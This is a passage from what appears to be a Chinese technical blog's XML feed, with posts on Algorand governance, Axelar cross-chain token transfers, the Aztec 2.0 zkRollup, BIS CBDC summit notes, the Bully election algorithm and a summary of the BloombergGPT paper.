<p>我们应该认识到，在任何复杂的系统中改变都是必要的。传统的加密货币是静态的，任何“改变方向”都需要一个硬分叉，从而导致社区分裂。从长远来看，分散会削弱社区和任何货币的效用。</p>
<p>传统的加密货币没有内置的安全机制来达成协议。因此，关于变革的辩论是非常结构化的，无论达成任何形式的协议，都必须在链条外达成。因此，人们总是怀疑任何结论的正确性。</p>
<p>相比之下，Algorand使社区和协议得以发展。Algorand以其有效和安全的拜占庭协议为中心。经过辩论后，在区块链上发布了一项拟议更改，并使用Algorand的共识协议，社群投票接受或拒绝该提案。如果获得批准，建议的更改将立即生效。</p>
<p>在Algorand，这种协议并不是通过智能合同来实施的。相反，它直接内置于协议的核心。</p>
<p>相关文章链接：</p>
<p><a href="https://willzhuang.github.io/2018/03/31/%E5%8F%AF%E9%AA%8C%E8%AF%81%E9%9A%8F%E6%9C%BA%E5%87%BD%E6%95%B0VRF%E4%B9%8BAlgorand%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95/">可验证随机函数VRF之Algorand共识算法</a></p>
]]></content>
      <tags>
        <tag>共识算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Axelar跨链机制</title>
    <url>/2024/04/18/Axelar%E8%B7%A8%E9%93%BE%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>reference: <a href="https://docs.axelar.dev/">https://docs.axelar.dev/</a></p>
<h3 id="跨链转移Token"><a href="#跨链转移Token" class="headerlink" title="跨链转移Token"></a>跨链转移Token</h3><p>情况一：<a href="https://docs.axelar.dev/dev/send-tokens/introduction#call-sendtoken-on-an-evm-source-chain">Call <code>sendToken()</code> on an EVM source chain</a><br>    - step 1: 找到 source chain 的 Gateway 的合约地址。<br>    EVM 链使用 Axelar Gateway 智能合约发送Token。 这些是应用程序层智能合约，用于发送和接收有效负载以及监控交易状态。<br>Gateway合约的接口如下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function sendToken(</span><br><span class="line">    string memory destinationChain,</span><br><span class="line">    string memory destinationAddress,</span><br><span class="line">    string memory symbol,</span><br><span class="line">    uint256 amount</span><br><span class="line">) external;</span><br></pre></td></tr></table></figure>
<pre><code>- step 2: 调用 source chain 的approve()。
- step 3: 在 source chain 上，利用Gateway合约将调用sendToken()。</code></pre>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sendToken(</span><br><span class="line">    &quot;avalanche&quot;, &#x2F;&#x2F; destination chain name</span><br><span class="line">    &quot;0xF16DfB26e1FEc993E085092563ECFAEaDa7eD7fD&quot;, &#x2F;&#x2F; some destination wallet address (should be your own)</span><br><span class="line">    &quot;axlUSDC&quot;, &#x2F;&#x2F; asset symbol, can be differ by chain, see above</span><br><span class="line">    100000000 &#x2F;&#x2F; amount (in atomic units)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>此时，token将出现在目标链（destination chain）的地址上。</p>
<p>情况二：<a href="https://docs.axelar.dev/dev/send-tokens/introduction#call-sendtoken-on-a-cosmos-based-source-chain">## Call <code>sendToken()</code> on a Cosmos-based source chain</a><br>基于COSMOS的 source chain的话，sendToken()是一笔IBC的交易。消息（message）被投送到 Axelar 到一个固定的地址上<code>axelar1dv4u5k73pzqrxlzujxg3qp8kvc3pje7jtdvu72npnt5zhq05ejcsn5qme5</code>，该地址在Axelar网络上，被用于接收GMP消息，消息格式如下：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  destination_chain,</span><br><span class="line">  destination_address,</span><br><span class="line">  payload: <span class="literal">null</span>,</span><br><span class="line">  <span class="keyword">type</span>: <span class="number">3</span>, <span class="comment">// corresponds to the `sendToken` command on Axelar</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="利用AxelarJS-SDK调用sendToken"><a href="#利用AxelarJS-SDK调用sendToken" class="headerlink" title="利用AxelarJS SDK调用sendToken()"></a>利用AxelarJS SDK调用sendToken()</h3><p>前端应用可以利用AxelarJS SDK调用sendToken()。</p>
<h3 id="使用存款地址（deposit-address）转移资产"><a href="#使用存款地址（deposit-address）转移资产" class="headerlink" title="使用存款地址（deposit address）转移资产"></a>使用存款地址（deposit address）转移资产</h3><p>存款地址（deposit address）是由 Axelar 中继服务（Relayer）创建和监控的临时一次性地址。 存款地址通常最多可运行 24 小时。如果出现以下情况，请使用存款地址：</p>
<ul>
<li>您需要 sendToken() 方法未提供的功能，例如 Cosmos-to-X。</li>
<li>您希望允许从不与 Axelar 交互的钱包进行Token转移，例如从中心化交易所提取资金时。<br>如需使用存款地址转移资产，需要使用AxelarJS SDK并发起AxelarAssetTransfer。</li>
</ul>
<h3 id="构建跨链代币（Interchain-Token）"><a href="#构建跨链代币（Interchain-Token）" class="headerlink" title="构建跨链代币（Interchain Token）"></a>构建跨链代币（Interchain Token）</h3><p>链间代币是可在多个区块链上使用的 ERC-20 token。借助 Axelar 的链间代币服务 (Interchain Token Service)，可以从头开始创建新的跨链代币，也可以更新以太坊区块链上已存在的Token。如果Token不被 Axelar 支持，将该Token加入链间代币服务 (Interchain Token Service)即可。</p>
]]></content>
      <tags>
        <tag>crosschain</tag>
      </tags>
  </entry>
  <entry>
    <title>Aztec 2.0 以隐私性为核心的 zkRollup Layer 2 方案</title>
    <url>/2020/11/16/Aztec%202.0%20%E4%BB%A5%E9%9A%90%E7%A7%81%E6%80%A7%E4%B8%BA%E6%A0%B8%E5%BF%83%E7%9A%84%20zkRollup%20Layer%202%20%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<p>原文链接==&gt;<a href="https://medium.com/aztec-protocol/aztec-zkrollup-layer-2-privacy-1978e90ee3b6">https://medium.com/aztec-protocol/aztec-zkrollup-layer-2-privacy-1978e90ee3b6</a></p>
<h3 id="一句话总结：Aztec-2-0正在帮以太坊扩容"><a href="#一句话总结：Aztec-2-0正在帮以太坊扩容" class="headerlink" title="一句话总结：Aztec 2.0正在帮以太坊扩容:"></a><strong>一句话总结：Aztec 2.0正在帮以太坊扩容:</strong></h3><ul>
<li><strong>基于 zkRollup 的 Layer 2</strong> 网络，在 Ropsten 上运行</li>
<li>默认<strong>私密转账</strong> —— 通过私密方式发送你的 ERC 20 代币</li>
<li><strong>社交密钥恢复</strong>机制</li>
<li><strong>可扩展的 DeFi 私密访问</strong> （Uniswap 等）</li>
<li>相比 Aztec 1.0，<strong>gas 使用量降低了 200 倍</strong></li>
<li><strong>设计安全性</strong>：所有交易都在链上验证</li>
<li><strong>通过 Noir</strong>（私密合约语言）<strong>实现可编程的隐私性</strong></li>
</ul>
<p>上述功能是我们的顶尖研究团队的成果。过去 15 个月来，我们的团队为社区贡献了 PLONK 和 Plookup，现已是 zkSNARK 的主要标准。</p>
<h3 id="即刻体验"><a href="#即刻体验" class="headerlink" title="即刻体验"></a>即刻体验</h3><p>开发者可以直接参阅我们的文档；</p>
<ul>
<li>文档：<a href="http://developers.aztec.network/">http://developers.aztec.network/</a></li>
</ul>
<p>如果你想查看我们在 Ropsten 上运行的网络，或体验我们的命令行 rollup 服务，请点击下方链接：</p>
<ul>
<li>区块浏览器：<a href="https://explorer.aztec.network/">https://explorer.aztec.network/</a></li>
<li>终端 demo：<a href="https://terminal.aztec.network/">https://terminal.aztec.network/</a></li>
</ul>
<h3 id="隐私就现在"><a href="#隐私就现在" class="headerlink" title="隐私就现在"></a>隐私就现在</h3><p>经典的 Layer 2 架构优先提供可扩展性，隐私性则暂时搁置。</p>
<p>Aztec 则不同。我们在 PLONK 上的研究让我们发现， zkSNARK 有两种完全不同的使用方法：</p>
<ol>
<li>每个交易都被编码成 zkSNARK，来保护用户数据</li>
<li>中继者再将这些交易打包成一个一个批次，然后再 “汇总（rollup）”成一个 zkSNARK 证明（这条对 rollup 内部计算有效性的证明会被发送到以太坊上，从而实现可扩展性）</li>
</ol>
<p>使用 zkSNARK 技术，网络可按需扩展至<strong>每秒约 300 笔交易的硬性限制</strong>，同时保留链上数据可用性。</p>
<h3 id="跨资产扩展"><a href="#跨资产扩展" class="headerlink" title="跨资产扩展"></a>跨资产扩展</h3><p>通常来说，rollup 所聚合的交易都是 “同质的” —— 即，它们都属于相同类型。由于 Aztec 交易都是 zkSNARK 证明，它们可以全部到捆绑到一个 zkRollup 中。</p>
<p>具体来说，<strong>私密 DeFi 交易可以与 zkDAI 付款或 Uniswap 交易捆绑到一个 rollup 中。</strong></p>
<h3 id="Noir-编程语言：私密智能合约"><a href="#Noir-编程语言：私密智能合约" class="headerlink" title="Noir 编程语言：私密智能合约"></a>Noir 编程语言：私密智能合约</h3><p>Noir 是一种开源脚本语言，可以让开发者轻松编写与 Aztec 2.0 兼容的 zkSNARK 交易。</p>
<p>Noir 为开发者提供了工具，可以用来为主网协议编写自定义逻辑，从 DeFi 到资本市场再到订单簿。</p>
<p>Noir 可以让开发者：</p>
<ul>
<li>自定义私密交易</li>
<li>用任意椭圆曲线生成签名</li>
<li>用电路来调用以太坊合约</li>
<li>Aztec 标准库 —— 常见密码学原语的高效已审核版本</li>
</ul>
<h3 id="社交恢复"><a href="#社交恢复" class="headerlink" title="社交恢复"></a>社交恢复</h3><p>用户账户<strong>不需要关联以太坊地址，初次接收资金前也不需要链上交易来开户</strong>。</p>
<p>可以使用人类可读的账户名——也就是说，你的账户名可以是 <strong>@MontezumaII 而非 0x48af9…</strong></p>
<p>重点部分：</p>
<ul>
<li>账户支持<strong>多个密钥</strong></li>
<li>内设<strong>社交恢复</strong>机制</li>
<li><strong>支付密钥</strong>独立于加密密钥 —— 这有助于让合规应用保留简洁且符合 KYC 要求的记录</li>
</ul>
<h3 id="减少-Gas-消耗量"><a href="#减少-Gas-消耗量" class="headerlink" title="减少 Gas 消耗量"></a>减少 Gas 消耗量</h3><p>相比 Aztec 1.0，Aztec 2.0 可将 gas 成本降低 200 倍。</p>
<h3 id="Aztec-目前提供哪些功能"><a href="#Aztec-目前提供哪些功能" class="headerlink" title="Aztec 目前提供哪些功能"></a>Aztec 目前提供哪些功能</h3><ul>
<li><strong>存款</strong>：将代币存入 Aztec 来隐蔽其踪迹</li>
<li><strong>私密付款</strong>：加密的余额和身份 —— 面向所有币种</li>
<li><strong>多设备恢复</strong>：避免私钥丢失所带来的风险</li>
<li><strong>取款</strong>：通过匿名方式将你的资产退回到 Layer 1 上。</li>
<li><strong>应急出口</strong>：即使所有 rollup 提供商都出了问题，你也可以退出系统。</li>
</ul>
<p>上述功能都可以通过我们的软件开发工具包实现。 </p>
<h3 id="示例：Aztec-网络上的-Uniswap"><a href="#示例：Aztec-网络上的-Uniswap" class="headerlink" title="示例：Aztec 网络上的 Uniswap"></a>示例：Aztec 网络上的 Uniswap</h3><p>我们来看一下 DeFi 是如何在 Aztec 2.0 上运作的：</p>
<ol>
<li>用户在 Uniswap 上将余额中的一部分 Dai兑换成以太币</li>
<li>rollup 将 100 笔同类交易捆绑到同一笔交易中</li>
<li>Aztec 合约代表用户接收以太币</li>
<li>以太币由池中参与者按比例持有</li>
<li>每个参与者都受益于大型匿名集，并且只需支付较低的 gas 价格</li>
</ol>
<p>大多数 DeFi 协议都可以通过这种方式集成，更重要的是，可以使用已经过审计的 Layer 1 代码。</p>
<p>从今天起，开发者可以通过我们的 TypeScript SDK 访问 Aztec 网络。只需运行以下指令即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yarn add @aztec/sdk</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>BIS-Innovation-Summit-2024</title>
    <url>/2024/05/06/BIS-Innovation-Summit-2024/</url>
    <content><![CDATA[<p><a href="https://www.bis.org/events/bis_innovation_summit_2024/overview.htm">https://www.bis.org/events/bis_innovation_summit_2024/overview.htm</a></p>
<h3 id="High-level-panel"><a href="#High-level-panel" class="headerlink" title="High-level panel"></a><strong>High-level panel</strong></h3><p>The future of CBDCs: the road ahead for retail versus wholesale CBDCs<br><em>Technology is evolving rapidly, and many experiments in the area of CBDC are in progress or have been concluded. Policy makers are still observing and deciding any next steps. In that context, panellists will discuss the future of retail and wholesale CBDCs.</em><br><strong>Speakers:</strong>  </p>
<ol>
<li>Shaktikanta Das, Governor, Reserve Bank of India, Blockchain-based tokens can facilitate peer-to-peer payments, but future advancements are needed, such as: 1) programmable features; 2) interest-bearing or interest-free options; 3) offline usability; 4) digital representation of physical cash; 5) varying levels of access control. When comparing fast payment systems to tokenized central bank digital currency (CBDC) payments linked to universal basic income (UBI) bank accounts, tokenized CBDC payments offer advantages such as: 1) enhanced efficiency and transparency; 2) capability to accommodate various token types; 3) automation through programmable features.</li>
<li>Joachim Nagel, President, Deutsche Bundesbank There’s a need to accelerate the development of digital currency, and CBDCs will be distinct. A single distributed ledger technology (DLT) platform can support a wide range of services.</li>
<li>Fabio Panetta, Governor, Bank of Italy Difficulties encountered with centralized CBDCs include: 1) challenges in handling a large volume of system requests and transactions in retail payments; 2) difficulty in achieving privacy. Additionally, CBDCs must consider facilitating convenient and cost-effective cross-border transactions as a functional requirement. Tokenization options include: 1) each country creating its own token; 2) utilizing an EU DLT process for wholesale settlement. In the future, there may be a greater demand for data engineers rather than economic analysts.</li>
</ol>
<h3 id="Showcase"><a href="#Showcase" class="headerlink" title="Showcase:"></a>Showcase:</h3><ol>
<li><p><strong>project Mandala</strong> <a href="https://www.bis.org/about/bisih/topics/cbdc/mandala.htm">https://www.bis.org/about/bisih/topics/cbdc/mandala.htm</a><br><img src="/2024/05/06/BIS-Innovation-Summit-2024/1.png"><br><img src="/2024/05/06/BIS-Innovation-Summit-2024/2.png"></p>
</li>
<li><p><strong>project mBridge</strong> <a href="https://www.bis.org/about/bisih/topics/cbdc/mcbdc_bridge.htm">https://www.bis.org/about/bisih/topics/cbdc/mcbdc_bridge.htm</a><br><img src="/2024/05/06/BIS-Innovation-Summit-2024/3.png"><br><img src="/2024/05/06/BIS-Innovation-Summit-2024/4.png"><br><img src="/2024/05/06/BIS-Innovation-Summit-2024/5.png"><br><img src="/2024/05/06/BIS-Innovation-Summit-2024/6.png"><br><img src="/2024/05/06/BIS-Innovation-Summit-2024/7.png"></p>
</li>
</ol>
<p><img src="/2024/05/06/BIS-Innovation-Summit-2024/8.png"><br><img src="/2024/05/06/BIS-Innovation-Summit-2024/9.png"><br>screenshot of HK central bank system, trading from e-HKD to e-THB via mBridge.<br><img src="/2024/05/06/BIS-Innovation-Summit-2024/10.png"></p>
<p><img src="/2024/05/06/BIS-Innovation-Summit-2024/11.png"></p>
<p>Full video link ==&gt; <a href="https://www.youtube.com/watch?v=V2UJ9xzbJGs">https://www.youtube.com/watch?v=V2UJ9xzbJGs</a></p>
]]></content>
      <tags>
        <tag>CBDC</tag>
      </tags>
  </entry>
  <entry>
    <title>BIS张志军观点学习20240113</title>
    <url>/2024/01/13/BIS%E5%BC%A0%E5%BF%97%E5%86%9B%E8%A7%82%E7%82%B9%E5%AD%A6%E4%B9%A020240113/</url>
    <content><![CDATA[<p>张志军 - 国际清算银行创新中心顾问 / 世界银行集团首席信息安全架构师 / 马里兰大学计算机博士 / 北京大学计算机学士</p>
<p>分享题目《跨境支付的量化目标和实施方案》<br>观点如下：</p>
<ol>
<li>关于本题目，达到目标的重点 - 1）通过换汇服务的多样性来降低成本；2）通过系统互联或者央行数字货币来缩短延长。</li>
<li>对数字货币的安全界定？数字货币的安全需基于法定货币。</li>
<li>对digital asset在中国的发展建议？香港作为很好的试验田可以先行先试。</li>
<li>区块链在当前的最佳用例？各大银行间清算。如<a href="https://www.jpmorgan.com/onyx/index">Onyx 在 J.P.Morgan 内部</a>的使用。</li>
<li>区块链在国际汇款用例可否使用？目前国际汇款的国际标准是<a href="https://www.iso20022.org/about-iso-20022"> ISO20022</a>，区块链还不是。</li>
</ol>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>Bully Election Algorithm</title>
    <url>/2018/03/27/Bully-Election-Algorithm/</url>
    <content><![CDATA[<p>欺负算法</p>
<p>We start with 6 processes,<br>    all directly connected to each other.<br>Process 6 is the leader,<br>    as it has the highest number.<br><img src="/2018/03/27/Bully-Election-Algorithm/1.gif"><br>Process 6 fails.<br><img src="/2018/03/27/Bully-Election-Algorithm/2.gif"><br>Process 3 notices that Process 6 does not respond<br>    So it starts an election, notifying those processes<br>        with ids greater than 3.<br><img src="/2018/03/27/Bully-Election-Algorithm/3.gif"><br>Both Process 4 and Process 5 respond,<br>    telling Process 3 that they’ll take over from here.<br><img src="/2018/03/27/Bully-Election-Algorithm/4.gif"><br>Process 4 sends election messages<br>    to both Process 5 and Process 6.<br><img src="/2018/03/27/Bully-Election-Algorithm/5.gif"><br>Only Process 5 answers<br>    and takes over the election.<br><img src="/2018/03/27/Bully-Election-Algorithm/6.gif"><br>Process 5 sends out only one election message<br>    to Process 6.<br><img src="/2018/03/27/Bully-Election-Algorithm/7.gif"><br>When Process 6 does not respond<br>    Process 5 declares itself the winner.<br><img src="/2018/03/27/Bully-Election-Algorithm/8.gif"></p>
]]></content>
      <tags>
        <tag>共识算法</tag>
      </tags>
  </entry>
  <entry>
    <title>BloombergGPT论文解读</title>
    <url>/2023/09/14/BloombergGPT%E8%AE%BA%E6%96%87%E8%A7%A3%E8%AF%BB/</url>
    <content><![CDATA[<h3 id="1-背景"><a href="#1-背景" class="headerlink" title="1. 背景"></a>1. 背景</h3><p>BloombergGPT是布隆伯格2023年3月30日公开在arXiv的一篇文章——<a href="https://arxiv.org/abs/2303.17564">BloombergGPT: A Large Language Model for Finance</a>中涉及到的语言模型，也是金融领域第一个公开发表文章的大语言模型（以下简称“LLM”）。</p>
<h3 id="2-要点"><a href="#2-要点" class="headerlink" title="2. 要点"></a>2. 要点</h3><ul>
<li>BloombergGPT是Bloomberg训练出来的金融大语言模型（LLM for Finance）</li>
<li>模型参数量为500亿，使用了包含3630亿token的金融领域数据集以及3450亿token的通用数据集</li>
<li>隐藏层维度为7680，多头的头数为40</li>
<li>模型采用Unigram tokenizer，AdamW优化器</li>
<li>模型在64个AWS的p4d.24xlarge实例上训练了53天，其中每个p4d.24xlarge实例包含了8块40GB的A100GPU</li>
<li>对BloombergGPT的评估包含了两部分：金融领域评估与通用领域评估</li>
<li>评估对比的其他大语言模型有GPT-NeoX、OPT、BLOOM、GPT-3</li>
<li>在金融领域任务上，BloombergGPT综合表现最好；在通用任务上，BloombergGPT的综合得分同样优于相同参数量级的其他模型，并且在某些任务上的得分要高于参数量更大的模型</li>
<li>BloombergGPT模型在金融领域取得好效果的同时，并没有以牺牲模型通用能力为代价</li>
<li>对模型定性评估的结果表明，BloombergGPT可以提高工作效率</li>
<li>出于安全性的考虑，BloogbergGPT模型不会被公开，但是模型训练和评估的相关经验和思考会被分享出来</li>
<li>作者认为，对模型效果提升促进最大的三个因素（按影响从高到低排序）分别为精心清洗的数据集、合理的tokenizer、流行的模型结构</li>
</ul>
<p>文章的主要贡献在以下几点：</p>
<ul>
<li>混合数据集训练方法不仅可以在特定任务上表现出色，也可以在一般NLP基准测试上表现良好</li>
<li>不同于常见的网络爬取数据，本文的数据包含了巨量的可信来源的精心清洗的数据</li>
<li>不仅包含了模型在基准测试集上的评估结果，也包含了在Bloomberg内部任务上的评估结果</li>
<li>在超过7000亿个token的语料库中的5690亿个token上训练出一个500亿参数的LLM</li>
<li>使用Unigram模型而非常用的基于贪心合并的子词标记器进行tokenize，方便在推理时进行更智能的标记化</li>
<li>借鉴BLOOM的训练大模型方法，同时也将自己自己在训练BloombergGPT中的经验分享</li>
</ul>
<h3 id="3-数据集"><a href="#3-数据集" class="headerlink" title="3.数据集"></a>3.数据集</h3><p><strong>BloombergGPT是一个有500亿参数、基于BLOOM模型的LLM</strong>，过程中采用了一种兼具通用能力和特定领域的方法。<br>作者首先构建了FinPile——一个包含了新闻、档案、网络爬取的新闻稿件、英文财经文档等英文金融文档的金融领域数据集，同时也采用了通用的数据集。</p>
<h4 id="金融领域数据集"><a href="#金融领域数据集" class="headerlink" title="金融领域数据集"></a>金融领域数据集</h4><p>金融领域数据集共包含了3630亿个token，占总数据集token量的54.2%，具体由以下几个部分构成：</p>
<ul>
<li>金融领域相关网页，2980亿token，占比42.01%</li>
<li>金融领域知名新闻源，380亿token，占比5.31%</li>
<li>公司财报，140亿token，占比2.04%</li>
<li>金融相关公司的出版物，90亿token，占比1.21%</li>
<li>bloomberg，50亿token，占比0.7%</li>
</ul>
<p>因为包含一部分收费和私有数据，所以这份数据集不会被公开，但是文章中公开了模型训练方法。</p>
<h4 id="通用数据集"><a href="#通用数据集" class="headerlink" title="通用数据集"></a>通用数据集</h4><p>**通用数据集共包含了3450亿个token，占总数据集token量的48.73%**，具体分为如下几个部分：</p>
<ul>
<li>The Pile数据集，1840亿token，占比25.9%</li>
<li>C4数据集，1380亿token，占比19.48%</li>
<li>Wikipedia数据集，240亿token，占比3.35%</li>
</ul>
<p>数据集使用Unigram tokenizer对原始文本进行tokenize。具体处理时，作者这了两点改进（具体内容可参考原论文《2.3Tokenization》）：</p>
<ul>
<li>在pretokenization这一步，将数字视为单个token，并且允许词组的存在，以提高信息密度减少句子长度</li>
<li>使用分治的思想优化Unigram tokenizer在大数据集上的实现，并对最终词表大小控制在13万这个数量级上</li>
</ul>
<h3 id="4-模型"><a href="#4-模型" class="headerlink" title="4.模型"></a>4.模型</h3><h4 id="模型结构"><a href="#模型结构" class="headerlink" title="模型结构"></a>模型结构</h4><p>模型基于BLOOM模型的自回归结构，具体包含了70层transformer decoder。<br>另外一些细节如下（详见《3.1 Architecture》）：</p>
<ul>
<li>前馈层（FFN）中的非线性函数采用GELU</li>
<li>位置编码采用ALiBi编码</li>
<li>模型在第一层多了一个layer normalization</li>
</ul>
<h4 id="模型尺度"><a href="#模型尺度" class="headerlink" title="模型尺度"></a>模型尺度</h4><p>这一部分，作者先有了算力预算（<strong>40G内存A100共130万GPU小时</strong>），并且给中间checkpoint存储留出了约25%的时间预算。<br><strong>根据Chinchilla scaling laws，计算出模型的参数和需要的数据量大小——模型参数为500亿，token数据量为11000+亿</strong>。<br>考虑到金融领域token数量要占总token数量的50%以上，而且目前的数据暂时无法再进行扩充，最终<strong>模型参数量选择为500亿，token数据量为7000+亿</strong>。<br>另一方面，隐藏层维度D也可以根据decoder的层数计算出来，这里经过计算<strong>隐藏层维度为7680</strong>，多头的<strong>头数为40</strong>。</p>
<h4 id="训练配置"><a href="#训练配置" class="headerlink" title="训练配置"></a>训练配置</h4><p>这一部分原始论文写的比较详细，具体见《3.3 Training Configuration》，这里简单摘要如下：</p>
<ul>
<li>作者在<strong>每篇文档的最后添加了特殊标记&lt;|endoftext|&gt;，模型训练时选取的句子长度为2048token</strong></li>
<li>训练时采用的优化方法是<strong>AdamW，beta1、beta2、weight decay取值分别为0.9、0.95、0.1</strong>，初始学习率为6e-5，采用cosine衰减、线性warmup方式</li>
<li>模型参数随机初始化为<strong>均值0、标准差0.006588的正态分布</strong>，并对MLP的第二层和注意力层输出进行缩放</li>
<li>关于训练的不稳定性，文章中没有描述训练BloombergGPT时采用的方法，只是介绍了相关进展</li>
<li>关于计算使用到的硬件，使用了<strong>64个AWS的p4d.24xlarge实例，每个p4d.24xlarge实例包含了8块40GB的A100GPU</strong></li>
</ul>
<h4 id="大规模优化采用的方法"><a href="#大规模优化采用的方法" class="headerlink" title="大规模优化采用的方法"></a>大规模优化采用的方法</h4><p>这一部分中，作者描述了具体优化时采用的方法：ZeRO优化、MiCS、Activation Checkpointing、混合精度训练（Mixed Precision Training）、内核融合（fused kernels）。<br>具体见《3.4 Large-scale Optimization》<br>经过上述优化，上述硬件的<strong>平均算力水平达到了102TFLOPs</strong>，<strong>训练一步需要32.5秒</strong>。</p>
<h3 id="训练过程"><a href="#训练过程" class="headerlink" title="训练过程"></a>训练过程</h3><p>文章中记录<strong>模型共训练了139,200步</strong>，进行了约<strong>0.8个epoch</strong>，<strong>训练了53天</strong>。<br>一个epoch都没有训练完的原因是这时验证集上的损失函数已经不再继续下降了。<br><strong>具体训练过程如下</strong>：</p>
<ul>
<li>初始训练的batch size大小为1024，warm-up过程持续了7200步，随后作者将batch size修改为2048。</li>
<li>115,500步之后，验证集上的损失不再下降，然后作者将学习率缩小为原始的2/3；</li>
<li>129,900步之后，学习率缩小为之前的1/2，同时增加dropout</li>
<li>137,100步之后，学习率再次缩小为之前的1/2</li>
<li>最终，训练在146,000步结束。作者选取139,200这一步的模型最为最终使用的模型</li>
</ul>
<p>这里推荐阅读原始文章3.3节与3.4节中关于训练方法的描述，对于大模型训练有一定的参考意义。</p>
<h3 id="5-评估"><a href="#5-评估" class="headerlink" title="5.评估"></a>5.评估</h3><p>文章中对BloombergGPT的<strong>评估分成了两部分</strong>：<strong>金融领域任务与通用任务</strong>。这样做的目的也比较直观，就是<strong>验证在特定领域预训练后的模型能够在特定领域表现好，同时在通用领域的表现也不会差太多</strong>这一观点。<br>同时，文章<strong>对比了BloombergGPT、GPT-NeoX、OPT、BLOOM、GPT-3在不同任务上的表现</strong>。注意，这里<strong>因为GPT-3模型无法获取，故仅在部分通用任务上进行了评测</strong>。<br>作者对每一个模型均独立进行了评测，并且在每一个任务中使用相同的标准prompt、相同的样例、不使用任务描述和任何CoT prompt，以保证评测结果的公平性。<br>对于有多个答案的任务，文章中采用了**基于似然的分类方法（likelihood-based classification）进行评估；对于其他任务，文章采用贪心解码（greedy decoding）的方式进行评估。</p>
<h4 id="holdout-loss"><a href="#holdout-loss" class="headerlink" title="holdout loss"></a>holdout loss</h4><p>作者首先在FinPile数据集预留的部分样本上对各个模型进行了bits per byte的评估。<br>bits per byte指标是评估语言模型的一种常见指标<strong>，类似于perplexity，取值越小，模型越好。具体计算方法可见</strong><a href="https://stats.stackexchange.com/a/261789">How to compute bits per character (BPC)?</a><br><strong>BloombergGPT在金融语料上的bits per byte均好于其他模型，并且在财报（Filings）这个类别上表现尤其突出</strong>。这个结果也符合预期。否则可能就没有后面任务对比的必要了。<br>文章又将金融领域任务分成了<strong>外部任务和Bloomberg内部任务</strong>。在每个任务上，作者除了评估模型在任务上的表现，还评估了同一任务下不同模型生成结果之间两两比较的胜率（WR）。</p>
<h4 id="外部任务"><a href="#外部任务" class="headerlink" title="外部任务"></a>外部任务</h4><p>外部任务主要如下：</p>
<ul>
<li>ConvFinQA，标普500收益报告问答推理</li>
<li>FiQA SA，金融新闻和微博客标题基于方面的情感三分类（正负中）</li>
<li>FPB，金融新闻句子级别情感三分类（正负中）</li>
<li>Headline，新闻标题在预定义标签下的二分类</li>
<li>NER，信用风险评估数据的命名实体识别</li>
</ul>
<p><strong>BloombergGPT在上述5个任务中的4个都取得了最好效果，在另外一个取得了第二名；并且在模型两两结果对比的胜率最高，同时在ConvFinQA这个任务上遥遥领先。</strong></p>
<h4 id="Bloomberg内部任务之情感分析"><a href="#Bloomberg内部任务之情感分析" class="headerlink" title="Bloomberg内部任务之情感分析"></a>Bloomberg内部任务之情感分析</h4><p>这个任务中的情感分析均为基于方面的情感三分类（aspect-specific sentiment），数据集的内容通过任务名称就可以略知一二。<br><strong>BloombergGPT在上述4个数据集上的表现均大幅领先于其他模型</strong>。</p>
<h4 id="探索性任务：NER"><a href="#探索性任务：NER" class="headerlink" title="探索性任务：NER"></a>探索性任务：NER</h4><p>注意，这里的<strong>NER只涉及到ORG、PER、LOC这三类实体</strong>。<br>同时探索性任务<strong>NER+NED是指识别出实体后再将实体链接到上市公司的股票简称</strong>。比如“AAPL announced that they will stop using Intel chips in future products.” 这句话<strong>NER的结果是“AAPL, Intel”</strong>，<strong>NER+NED的结果是 “AAPL, INTC”</strong>。<br>这两类任务涉及到的数据集包括了<strong>7个数据集</strong>，分别为BN（Bloomberg BN wire上内容）、BFW（Bloomberg First Word上的内容）、Filings（财报内容）、Headlines（Bloomberg news内容）、Premium（Bloogberg收录 的第三方新闻内容）、Transcripts（公司新闻发布会的文字记录）、Social Media。<br>最终，<strong>NER任务下，BloombergGPT仅在Headlines这一个数据集上得分最高；但在NER+NED任务下，BloombergGPT在除了Social Media任务的其他任务上均得分第一</strong>。</p>
<h4 id="通用任务"><a href="#通用任务" class="headerlink" title="通用任务"></a>通用任务</h4><p>文章在通用任务上做了相当多的对比，这里<strong>仅对任务类型和结果做简要描述，详细内容见文章中的5.4~5.7节</strong>。<br>作者在<strong>BIG-bench Hard</strong>（BIG-bench的一个子集，仅包含目前模型表现无法超过人类的任务）、<strong>常识测试</strong>（不提供任何背景知识，仅可以训练时使用的数据）、<strong>阅读理解</strong>、<strong>语言学</strong>（消歧、语法识别、蕴含判别等）等任务上进行了测试。<br><strong>在BIG-bench Hard任务上，BloombergGPT得分低于参数量更大的PaLM和BLOOM，但是与参数规模类似的GPT-NeoX或OPT66B相比，BloombergGPT的性能更接近BLOOM</strong>，这说明开发金融专用的大语言模型并没有明显牺牲其通用能力。<br><strong>在常识测试任务中，BloombergGPT在1个任务上取得了第一名，在其余3个任务上取得了第二名（这里未考虑GPT-3）</strong>。<br><strong>在阅读理解任务上，GPT-3在所有任务上排名第一，BloombergGPT在5/6个任务上排名第二</strong>，且得分远高于BLOOM模型。<br><strong>在语言学任务上，GPT-3在综合排名第一，BloombergGPT综合排名第二</strong>，且综合得分高于BLOOM模型。</p>
<h4 id="评测总结"><a href="#评测总结" class="headerlink" title="评测总结"></a>评测总结</h4><p><strong>在金融领域任务上，BloombergGPT综合表现最好</strong>；<br><strong>在通用任务上，BloombergGPT的综合得分优于相同参数量级的其他模型，并且在某些任务上的得分要高于参数量更大的模型</strong>。<br>这都说明，开发金融专用的大语言模型在金融领域取得好效果的同时，并没有以牺牲模型通用能力为代价。<br>这一结论也可以给我们一个启示，<strong>在其他特定领域，我们也可以开发专用的大语言模型</strong>。</p>
